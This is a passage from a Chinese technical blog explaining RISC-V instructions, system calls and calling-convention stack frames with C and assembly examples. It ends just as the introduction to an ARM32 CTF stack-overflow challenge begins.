</tr>
<tr>
<td>6</td>
<td>J 型指令</td>
<td>用于无条件跳转操作</td>
</tr>
</tbody></table>
<p>如果一些CPU有更多的功能要求，可以在基础指令的基础上组装<strong>扩展指令</strong>，扩展指令主要有以下这些：</p>
<ul>
<li>M：乘除法、取模求余指令</li>
<li>F：单精度浮点指令</li>
<li>D：双精度浮点指令</li>
<li>Q：四倍浮点指令</li>
<li>A：原子操作指令，例如常见的cas（compare and swap）指令</li>
<li>C：压缩指令，主要用于改善程序大小</li>
<li>G：&#x3D; I+M+A+D+F，表示通用处理器所包含的指令集</li>
<li>其他可参考：RISC-V官方手册</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240419192916102.png"
                      alt="image-20240419192916102"
                ></p>
<p><strong>算术运算</strong></p>
<ul>
<li><code>add rd,rs1,rs2</code> 将寄存器rs1与rs2的值相加并写入寄存器rd。</li>
<li><code>sub rd,rs1,rs2</code> 将寄存器rs1与rs2的值相减并写入寄存器rd。</li>
<li><code>addi rd,rs1,imm</code> 将寄存器rs1的值与立即数imm相加并存入寄存器rd。</li>
<li><code>mul rd,rs1,rs2</code> 将寄存器rs1与rs2的值相乘并写入寄存器rd。</li>
<li><code>div rd,rs1,rs2</code> 将寄存器rs1除以寄存器rs2的值，向零舍入并写入寄存器rd。</li>
<li><code>rem rd,rs1,rs2</code> 将寄存器rs1模寄存器rs2的值并写入寄存器rd。</li>
</ul>
<p>以上运算发生溢出时会自动截断高位。乘法可以用<code>mulh/mulhu</code>获得两个32位数乘积的高32位，细节不赘述。</p>
<p><strong>逻辑运算</strong></p>
<ul>
<li><code>and rd,rs1,rs2</code> 将寄存器rs1与rs2的值按位与并写入寄存器rd。</li>
<li><code>andi rd,rs1,imm</code> 将寄存器rs1的值与立即数imm的值按位与并写入寄存器rd。</li>
<li><code>or rd,rs1,rs2</code> 将寄存器rs1与rs2的值按位或并写入寄存器rd。</li>
<li><code>ori rd,rs1,imm</code> 将寄存器rs1的值与立即数imm的值按位或并写入寄存器rd。</li>
<li><code>xor rd,rs1,rs2</code> 将寄存器rs1与rs2的值按位异或并写入寄存器rd。</li>
<li><code>xori rd,rs1,imm</code> 将寄存器rs1的值与立即数imm的值按位异或并写入寄存器rd。</li>
</ul>
<p><strong>移位运算</strong></p>
<ul>
<li><code>sll rd,rs1,rs2</code> 将寄存器rs1的值左移寄存器rs2的值这么多位，并写入寄存器rd。</li>
<li><code>slli rd,rs1,imm</code> 将寄存器rs1的值左移立即数imm的值这么多位，并写入寄存器rd。</li>
<li><code>srl rd,rs1,rs2</code> 将寄存器rs1的值逻辑右移寄存器rs2的值这么多位，并写入寄存器rd。</li>
<li><code>srli rd,rs1,imm</code>  将寄存器rs1的值逻辑右移立即数imm的值这么多位，并写入寄存器rd。</li>
<li><code>sra rd,rs1,rs2</code> 将寄存器rs1的值算数右移寄存器rs2的值这么多位，并写入寄存器rd。</li>
<li><code>srai rd,rs1,imm</code> 将寄存器rs1的值算数右移立即数imm的值这么多位，并写入寄存器rd。</li>
</ul>
<p>左移会在右边补0，逻辑右移会在最高位添0，算数右移在最高位添加符号位。</p>
<p>区分算数右移和逻辑右移，是从计算的角度考虑的：左移一位等于乘2，右移一位等于除2是算数的规律；无论正数负数，在右边补0都等于乘2；而负数进行逻辑右移的结果不等于除以2，需要用算数右移；而若只有算术右移，则无符号数的运算又会受影响。</p>
<p><strong>数据传输指令</strong></p>
<p>前面讲到，想要对主存中的数据进行运算，需要先将其取至寄存器，数据传输指令实现了这个目的。</p>
<p>现代计算机以<strong>字节</strong>（byte，1byte&#x3D;8bits)为基本单位，而内存本身可被视作由byte组成的一维数组，地址从0开始。<strong>字</strong>（word)则是存取数据的另一个单位，在RISC-V中1word&#x3D;4Bytes&#x3D;32bits，在其他体系结构中可能会发生变化。</p>
<ul>
<li><code>lb rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读一个字节，符号扩展后存入rd</li>
<li><code>lh rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读半个字，符号扩展后存入rd</li>
<li><code>lw rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读一个字，符号扩展后存入rd</li>
<li><code>lbu rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读一个无符号的字节，零扩展后存入rd</li>
<li><code>lhu rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读半个无符号的字，零扩展后存入rd</li>
<li><code>lwu rd,offset(rs1)</code> 从地址为寄存器rs1的值加offset的主存中读一个无符号的字，零扩展后存入rd</li>
<li><code>sb rs1,offset(rs2)</code> 把寄存器rs1的值存入地址为寄存器rs2的值加offset的主存中，保留最右端的8位</li>
<li><code>sh rs1,offset(rs2)</code> 把寄存器rs1的值存入地址为寄存器rs2的值加offset的主存中，保留最右端的16位</li>
<li><code>sw rs1,offset(rs2)</code> 把寄存器rs1的值存入地址为寄存器rs2的值加offset的主存中，保留最右端的32位</li>
</ul>
<blockquote>
<p> l是load的首字母，即加载数据；s是store的缩写，即存储数据。b，h，w分别是byte，half word，word的首字母，除此之外还有存取双字的d，即double word。</p>
</blockquote>
<p>举例：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">long long A[100];</span><br><span class="line">A[10] = A[3] + a;</span><br></pre></td></tr></table></figure></div>

<p>假设数组A首地址在寄存器x3，a在x2：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ld x10,24(x3)       # long long占64bits=8bytes，A[3]的地址为A[0]+3*8</span><br><span class="line">add x10,x2,x10</span><br><span class="line">sd x10,80(x3)</span><br></pre></td></tr></table></figure></div>

<p><strong>比较指令</strong></p>
<p>有符号数：</p>
<ul>
<li><code>slt rd,rs1,rs2</code> 若rs1的值小于rs1的值，rd置为1，否则置为0</li>
<li><code>slti rd,rs1,imm</code> 若rs1的值小于立即数imm，rd置为1，否则置为0</li>
</ul>
<p>无符号数：</p>
<ul>
<li><code>sltu rd,rs1,rs2</code> 若rs1的值小于rs1的值，rd置为1，否则置为0</li>
<li><code>sltiu rd,rs1,imm</code> 若rs1的值小于立即数imm，rd置为1，否则置为0</li>
</ul>
<p><strong>条件分支指令</strong></p>
<ul>
<li><code>beq rs1,rs2,lable</code> 若rs1的值等于rs2的值，程序跳转到lable处继续执行</li>
<li><code>bne rs1,rs2,lable</code> 若rs1的值不等于rs2的值，程序跳转到lable处继续执行</li>
<li><code>blt rs1,rs2,lable</code> 若rs1的值小于rs2的值，程序跳转到lable处继续执行</li>
<li><code>bge rs1,rs2,lable</code> 若rs1的值大于等于rs2的值，程序跳转到lable处继续执行</li>
</ul>
<p><code>blt/bge</code>也有无符号版本<code>bltu/bgeu</code></p>
<p>举例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">do&#123;</span><br><span class="line">    i++;</span><br><span class="line">&#125;while(i&lt;10)</span><br><span class="line"></span><br><span class="line">add x2,x0,10        # x2 = 10</span><br><span class="line">add x3,x0,0         # i = 0存储在x3</span><br><span class="line">Loop:</span><br><span class="line">    add x3,x3,1     # i++</span><br><span class="line">    blt x3,x2,Loop  # i&lt;10则继续循环</span><br></pre></td></tr></table></figure></div>

<p><strong>无条件跳转指令</strong></p>
<ul>
<li><code>j label</code> 程序直接跳转到lable处继续执行</li>
<li><code>jal rd,label</code> 用于调用函数，把下一条指令的地址保存在rd中（通常用x1），然后跳转到label处继续执行</li>
<li><code>jalr rd,offset(rs)</code> 可用于函数返回，把下一条指令的地址存到rd中，然后跳转到rs+offset地址处的指令继续执行。若rd&#x3D;x0就是单纯的跳转（x0不能被修改）</li>
</ul>
<p>这里详细解释一下<code>jal/jalr</code>，在调用函数时，我们希望函数返回后，继续执行下一条指令，所以要把这下一条指令的地址存起来，再跳转到函数的代码块。函数执行完之后，根据先前存起来的指令地址，再跳回到调用处继续执行。</p>
<h3 id="系统调用-4"><a href="#系统调用-4" class="headerlink" title="系统调用"></a>系统调用</h3><p>在Linux下，RISC-V系统调用指令是<strong>ecal</strong>l，它用于触发一个系统调用。当ecall指令被执行时，RISC-V处理器会进入特权模式，并跳转到一个预定义的地址，这个地址通常是一个称为ecall_handler的函数。</p>
<p>在RISC-V架构中，系统调用的参数通常通过一组特定的寄存器传递。这些寄存器的使用可能会根据特定的系统调用约定而变化，但是通常情况下，这些寄存器的使用如下：</p>
<ul>
<li><p>a0 - a7：用于传递系统调用的参数。</p>
</li>
<li><p>a7：用于传递系统调用的编号。</p>
</li>
</ul>
<p>例如，如果你想调用exit系统调用，你可以将系统调用编号（在RISC-V中，exit系统调用的编号通常是10）存储在a7寄存器中，然后执行ecall指令。</p>
<h3 id="栈帧结构-4"><a href="#栈帧结构-4" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译参数：riscv32-unknown-elf-gcc -O0 -S</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">long_args</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">long</span> <span class="type">long</span> a8, <span class="type">int</span> a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  f(a8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">va_sum</span><span class="params">(<span class="type">int</span> args_num, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, args_num);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = args_num; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> arg = va_arg(ap, <span class="type">int</span>);</span><br><span class="line">    sum = sum + arg;</span><br><span class="line">  &#125;</span><br><span class="line">  va_end(ap);</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> *data = (<span class="type">long</span> <span class="type">long</span>*)__builtin_alloca(<span class="keyword">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));</span><br><span class="line">  *data = <span class="number">0x900000008</span>ll;</span><br><span class="line">  long_args(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, *data, <span class="number">10</span>);</span><br><span class="line">  va_sum(<span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>生成的汇编如下（注意<code>-O0</code>编译参数会将所有的参数和局部变量存储到栈上，在更高优化等级上会被优化，但是传参的方式会保持一致）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">long_args:</span><br><span class="line">        addi    sp,sp,-64</span><br><span class="line">        sw      ra,44(sp)</span><br><span class="line">        sw      s0,40(sp)</span><br><span class="line">        addi    s0,sp,48</span><br><span class="line">        sw      a0,-20(s0)</span><br><span class="line">        sw      a1,-24(s0)</span><br><span class="line">        sw      a2,-28(s0)</span><br><span class="line">        sw      a3,-32(s0)</span><br><span class="line">        sw      a4,-36(s0)</span><br><span class="line">        sw      a5,-40(s0)</span><br><span class="line">        sw      a6,-44(s0)</span><br><span class="line">        sw      a7,12(s0)</span><br><span class="line">        lw      a0,12(s0)</span><br><span class="line">        lw      a1,16(s0)</span><br><span class="line">        call    f</span><br><span class="line">        nop</span><br><span class="line">        lw      ra,44(sp)</span><br><span class="line">        lw      s0,40(sp)</span><br><span class="line">        addi    sp,sp,64</span><br><span class="line">        jr      ra</span><br><span class="line">va_sum:</span><br><span class="line">        addi    sp,sp,-80</span><br><span class="line">        sw      s0,44(sp)</span><br><span class="line">        addi    s0,sp,48</span><br><span class="line">        sw      a0,-36(s0)</span><br><span class="line">        sw      a1,4(s0)</span><br><span class="line">        sw      a2,8(s0)</span><br><span class="line">        sw      a3,12(s0)</span><br><span class="line">        sw      a4,16(s0)</span><br><span class="line">        sw      a5,20(s0)</span><br><span class="line">        sw      a6,24(s0)</span><br><span class="line">        sw      a7,28(s0)</span><br><span class="line">        sw      zero,-20(s0)</span><br><span class="line">        addi    a5,s0,32</span><br><span class="line">        sw      a5,-40(s0)</span><br><span class="line">        lw      a5,-40(s0)</span><br><span class="line">        addi    a5,a5,-28</span><br><span class="line">        sw      a5,-32(s0)</span><br><span class="line">        lw      a5,-36(s0)</span><br><span class="line">        sw      a5,-24(s0)</span><br><span class="line">        j       .L3</span><br><span class="line">.L4:</span><br><span class="line">        lw      a5,-32(s0)</span><br><span class="line">        addi    a4,a5,4</span><br><span class="line">        sw      a4,-32(s0)</span><br><span class="line">        lw      a5,0(a5)</span><br><span class="line">        sw      a5,-28(s0)</span><br><span class="line">        lw      a4,-20(s0)</span><br><span class="line">        lw      a5,-28(s0)</span><br><span class="line">        add     a5,a4,a5</span><br><span class="line">        sw      a5,-20(s0)</span><br><span class="line">        lw      a5,-24(s0)</span><br><span class="line">        addi    a5,a5,-1</span><br><span class="line">        sw      a5,-24(s0)</span><br><span class="line">.L3:</span><br><span class="line">        lw      a5,-24(s0)</span><br><span class="line">        bgt     a5,zero,.L4</span><br><span class="line">        lw      a5,-20(s0)</span><br><span class="line">        mv      a0,a5</span><br><span class="line">        lw      s0,44(sp)</span><br><span class="line">        addi    sp,sp,80</span><br><span class="line">        jr      ra</span><br><span class="line">main:</span><br><span class="line">        addi    sp,sp,-48</span><br><span class="line">        sw      ra,44(sp)</span><br><span class="line">        sw      s0,40(sp)</span><br><span class="line">        addi    s0,sp,48</span><br><span class="line">        addi    sp,sp,-16</span><br><span class="line">        addi    a5,sp,8</span><br><span class="line">        addi    a5,a5,15</span><br><span class="line">        srli    a5,a5,4</span><br><span class="line">        slli    a5,a5,4</span><br><span class="line">        sw      a5,-20(s0)</span><br><span class="line">        lw      a3,-20(s0)</span><br><span class="line">        li      a4,8</span><br><span class="line">        li      a5,9</span><br><span class="line">        sw      a4,0(a3)</span><br><span class="line">        sw      a5,4(a3)</span><br><span class="line">        lw      a5,-20(s0)</span><br><span class="line">        lw      a4,0(a5)</span><br><span class="line">        lw      a5,4(a5)</span><br><span class="line">        li      a3,10</span><br><span class="line">        sw      a3,4(sp)</span><br><span class="line">        sw      a5,0(sp)</span><br><span class="line">        mv      a7,a4</span><br><span class="line">        li      a6,7</span><br><span class="line">        li      a5,6</span><br><span class="line">        li      a4,5</span><br><span class="line">        li      a3,4</span><br><span class="line">        li      a2,3</span><br><span class="line">        li      a1,2</span><br><span class="line">        li      a0,1</span><br><span class="line">        call    long_args</span><br><span class="line">        li      a5,8</span><br><span class="line">        sw      a5,0(sp)</span><br><span class="line">        li      a7,7</span><br><span class="line">        li      a6,6</span><br><span class="line">        li      a5,5</span><br><span class="line">        li      a4,4</span><br><span class="line">        li      a3,3</span><br><span class="line">        li      a2,2</span><br><span class="line">        li      a1,1</span><br><span class="line">        li      a0,8</span><br><span class="line">        call    va_sum</span><br><span class="line">        li      a5,0</span><br><span class="line">        mv      a0,a5</span><br><span class="line">        addi    sp,s0,-48</span><br><span class="line">        lw      ra,44(sp)</span><br><span class="line">        lw      s0,40(sp)</span><br><span class="line">        addi    sp,sp,48</span><br><span class="line">        jr      ra</span><br></pre></td></tr></table></figure></div>

<p>汇编分析：</p>
<ul>
<li>main函数调用long_args函数时</li>
<li>caller为main函数，callee为long_args函数</li>
<li>long_args函数9个参数，其中arg8为long long类型（size为8字节），需要占用2个寄存器，其余参数均只占用一个寄存器</li>
<li>根据RISC-V调用约定，在main调用long_args函数之前，需要将前7个参数（arg1-arg7）放入寄存器a0-a6，arg8的低4字节内容放入寄存器a7，高4字节内容放入对应栈位置（即caller的outgoing stack arguments区域），arg9放入对应栈位置（即caller的outgoing stack arguments区域）。</li>
<li>对应的在long_args中，将存放arg8的低4字节寄存器a7中的值存入栈帧（即callee-allocated save area for arguments that are split between registers and the  stack区域）。在long_args中，会继续将arg8传给f函数，因此需要将arg8通过寄存器a0和a1传递。</li>
<li>stack frame snapshot when main call long_args</li>
</ul>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">|===============================|&lt;-- main function stack frame start (total 64 bytes)</span><br><span class="line">|    ra(4)                      |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    s0(4)                      |  | GPR save area (16)</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|</span><br><span class="line">|    data(4)                    |\</span><br><span class="line">|-------------------------------| | local variables (16)</span><br><span class="line">|    padding(12)                |/</span><br><span class="line">|===============================|</span><br><span class="line">|    *data(8)                   |\</span><br><span class="line">|-------------------------------| | dynamic allocation (16)</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|</span><br><span class="line">|    padding(8)                 |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    arg9(4)                    |  | outgoing stack arguments (16)</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    arg8_high(4)               |/</span><br><span class="line">|===============================|&lt;-- caller sp, long_args function stack frame start (total 64 bytes)</span><br><span class="line">|    a7/arg8_low(4)             |\  virtual-incoming-args + 4</span><br><span class="line">|-------------------------------|</span><br><span class="line">|    align STACK_BYTES(4)          |</span><br><span class="line">|-------------------------------| | callee-allocated save area for arguments that</span><br><span class="line">|    padding(8)                |/  are split between registers and the stack (16)</span><br><span class="line">|===============================|</span><br><span class="line">|    ra(4)                      |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    s0(4)                      |  | GPR save area (16)</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|&lt;-- virtual-stack-vars</span><br><span class="line">|    a0(4)                      |\   vitrual-stack-vars - 4</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    a1(4)                      |  \</span><br><span class="line">|-------------------------------|   \</span><br><span class="line">|    a2(4)                      |    \</span><br><span class="line">|-------------------------------|     \</span><br><span class="line">|    a3(4)                      |      \</span><br><span class="line">|-------------------------------|       | local variables (32)</span><br><span class="line">|    a4(4)                      |      /</span><br><span class="line">|-------------------------------|     /</span><br><span class="line">|    a5(4)                      |    /</span><br><span class="line">|-------------------------------|   /</span><br><span class="line">|    a6(4)                      |  /</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    padding(4)                 |/</span><br><span class="line">|===============================|&lt;-- callee sp</span><br></pre></td></tr></table></figure></div>

<ul>
<li>main函数调用var_sum函数时</li>
<li>caller为main函数，callee为var_sum函数</li>
<li>根据RISC-V调用约定，var_sum函数为可变参函数，除了第一个参数外，其他参数都是匿名参数。在main中调用var_sum前，需要将第一个参数放入寄存器a0，之后的匿名参数中，第1到7个匿名参数放入寄存器a1-a7，其余匿名参数通过函数栈帧传入（即caller的outgoing stack arguments区域）。</li>
<li>对应的在var_sum函数中，需要将通过a1-a7传入的参数存储到对应栈帧区域（即callee的callee-allocated save area for register varargs区域）</li>
<li>stack frame snapshot when main call var_sum</li>
</ul>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">|===============================|&lt;-- main function stack frame start (total 64 bytes)</span><br><span class="line">|    ra(4)                      |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    s0(4)                      |  | GPR save area (16)</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|</span><br><span class="line">|    data(4)                    |\</span><br><span class="line">|-------------------------------| | local variables (16)</span><br><span class="line">|    padding(12)                |/</span><br><span class="line">|===============================|</span><br><span class="line">|    *data(8)                   |\</span><br><span class="line">|-------------------------------| | dynamic allocation (16)</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|</span><br><span class="line">|    padding(12)                |\</span><br><span class="line">|-------------------------------| | outgoing stack arguments (16)</span><br><span class="line">|    vararg8(4)                 |/</span><br><span class="line">|===============================|&lt;-- virtual-incoming-args, caller sp, var_sum function stack frame start (total 80 bytes)</span><br><span class="line">|    a7/vararg7(4)              |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    a6/vararg6(4)              |  \</span><br><span class="line">|-------------------------------|   \</span><br><span class="line">|    a5/vararg5(4)              |    \</span><br><span class="line">|-------------------------------|     \</span><br><span class="line">|    a4/vararg4(4)              |      \</span><br><span class="line">|-------------------------------|       | callee-allocated save area</span><br><span class="line">|    a3/vararg3(4)              |      /  for register varargs (32)</span><br><span class="line">|-------------------------------|     /</span><br><span class="line">|    a2/vararg2(4)              |    /</span><br><span class="line">|-------------------------------|   /</span><br><span class="line">|    a1/vararg1(4)              |  /</span><br><span class="line">|-------------------------------| / --&gt; ap</span><br><span class="line">|    padding(4)                 |/</span><br><span class="line">|===============================|</span><br><span class="line">|    s0(4)                      |\</span><br><span class="line">|-------------------------------| | GPR save area (16)</span><br><span class="line">|    padding(12)                |/ </span><br><span class="line">|===============================|&lt;-- virtual-stack-vars</span><br><span class="line">|    sum(4)                     |\</span><br><span class="line">|-------------------------------| \</span><br><span class="line">|    i(4)                       |  \</span><br><span class="line">|-------------------------------|   \</span><br><span class="line">|    arg(4)                     |    \</span><br><span class="line">|-------------------------------|     \</span><br><span class="line">|    ap(4)                      |      | local variables (32)</span><br><span class="line">|-------------------------------|     /</span><br><span class="line">|    a0/args_num(4)             |    /</span><br><span class="line">|-------------------------------|   /</span><br><span class="line">|    calee sp(4)                |  /</span><br><span class="line">|-------------------------------| /</span><br><span class="line">|    padding(8)                 |/</span><br><span class="line">|===============================|&lt;-- callee sp</span><br><span class="line"> </span><br></pre></td></tr></table></figure></div>

<h1 id="异构-PWN"><a href="#异构-PWN" class="headerlink" title="异构 PWN"></a>异构 PWN</h1><p>异构Pwn和x86架构的Pwn不同点主要在于体系结构不同，默认大家对x86的Pwn比较熟悉了，下面主要是以几道CTF赛题来熟悉一下架构之间的区别，都比较简单就不详细讲了。</p>
<h2 id="ARM32-PWN"><a href="#ARM32-PWN" class="headerlink" title="ARM32 PWN"></a>ARM32 PWN</h2><p>可以自己编译一个带符号的 arm-libc|aarch64-libc，调试时候方便一些。</p>
<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><h4 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj typo"></a>jarvisoj typo</h4><p>静态编译的经过strip的arm32小端序程序，没找到相关的libc(看了编译的gcc版本默认的libc好像是2.17)，这里交叉引用寻找一下。</p>
<p>程序存在栈溢出。</p>
